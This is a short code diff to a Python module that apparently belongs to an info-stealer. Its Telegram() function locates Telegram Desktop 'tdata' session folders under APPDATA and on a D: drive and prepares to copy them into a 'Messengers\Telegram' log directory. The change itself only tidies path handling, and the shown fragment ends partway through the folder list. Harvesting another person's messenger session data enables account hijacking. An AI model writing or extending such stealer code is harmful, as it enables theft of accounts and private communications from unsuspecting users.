@@ -1,13 +1,12 @@
-from os import getenv,environ
+from os import environ
 from shutil import copytree,ignore_patterns
 from manager.logger import Log
 from preferences.config import config
 
 def Telegram():
     msgInfo = ""
-    roaming = getenv('APPDATA')
-    user = environ['USERPROFILE']
-    pathToLogs = f'{user}\\{config.pathToLogs}\\Messengers\\Telegram'
+    roaming = environ["APPDATA"]
+    pathToLogs = f'{config.pathToLogs}\\Messengers\\Telegram'
     dirs=[
         roaming+"\\Telegram Desktop\\tdata",
         'D:\\Telegram Desktop\\tdata',
